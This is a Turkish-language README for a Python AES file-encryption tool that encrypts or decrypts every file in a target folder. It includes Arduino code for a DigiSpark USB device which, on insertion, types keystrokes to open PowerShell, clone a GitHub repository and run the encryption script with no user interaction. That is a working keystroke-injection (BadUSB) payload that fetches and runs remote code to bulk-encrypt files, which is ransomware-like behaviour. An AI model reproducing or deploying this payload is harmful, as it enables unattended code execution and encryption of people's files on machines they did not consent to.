# Advanced Python Encryption

## Açıklama
Advanced Python Encryption, dosyaları AES şifreleme algoritması ile güvenli bir şekilde şifreleyip çözebilen bir projedir. Şifreleme işlemi, güçlü bir anahtar türetme fonksiyonu (PBKDF2) kullanılarak gerçekleştirilir. Ayrıca, bu proje bir **DigiSpark USB** cihazı ile otomatik çalıştırılabilir.

## Özellikler
- **AES Şifreleme & Deşifreleme**: AES-CBC modunda dosya şifreleme ve çözme.
- **Salt & Key Derivation**: PBKDF2 ile güvenli anahtar türetme.
- **DigiSpark Otomasyonu**: USB takıldığında otomatik olarak şifreleme sürecini başlatma.
- **GitHub Entegrasyonu**: PowerShell üzerinden otomatik repo klonlama ve çalıştırma.

## Kullanım

### 1️⃣ Kurulum
Projeyi kullanmak için aşağıdaki adımları takip edebilirsiniz:

#### Python Bağımlılıkları
Python modüllerini yüklemek için:
```bash
pip install pycryptodome
```

#### Projeyi Klonla
```bash
git clone https://github.com/polatAI/sifrele
cd sifrele
```

### 2️⃣ Çalıştırma
Şifreleme ve çözme işlemlerini başlatmak için aşağıdaki komutu çalıştırın:
```bash
python run.py
```

### 3️⃣ DigiSpark Entegrasyonu
DigiSpark cihazına yüklemek için **Arduino IDE**'yi kullanın ve aşağıdaki kodu yükleyin:

```cpp
#include "DigiCombo.h"

void setup() {
    DigiCombo.begin();
    DigiCombo.delay(3000);
    DigiCombo.sendKeyStroke(0x15, 0x08);  // Win + R
    DigiCombo.delay(1000);
    DigiCombo.println("powershell");
    DigiCombo.sendKeyStroke(0x28);
    DigiCombo.delay(2000);
    DigiCombo.println("cd C:\\Users\\pc\\Desktop\\youtube");
    DigiCombo.sendKeyStroke(0x28);
    DigiCombo.delay(500);
    DigiCombo.println("git clone https://github.com/polatAI/sifrele");
    DigiCombo.sendKeyStroke(0x28);
    DigiCombo.delay(5000);
    DigiCombo.println("Set-Location sifrele");
    DigiCombo.sendKeyStroke(0x28);
    DigiCombo.delay(500);
    DigiCombo.println("python run.py");
    DigiCombo.sendKeyStroke(0x28);
}

void loop() {}
```

## Çalışma Mantığı
- **Klasördeki Dosyalar Şifrelenir**: Eğer hedef klasörde şifrelenmemiş dosya varsa, otomatik olarak AES ile şifrelenir.
- **Şifrelenmiş Dosyalar Çözülür**: Eğer klasörde şifrelenmiş dosyalar varsa, bu dosyalar çözümlenir.
- **DigiSpark Entegrasyonu**: USB takıldığında yukarıdaki adımları otomatik gerçekleştirir.



## Lisans
Bu proje **MIT Lisansı** ile lisanslanmıştır.
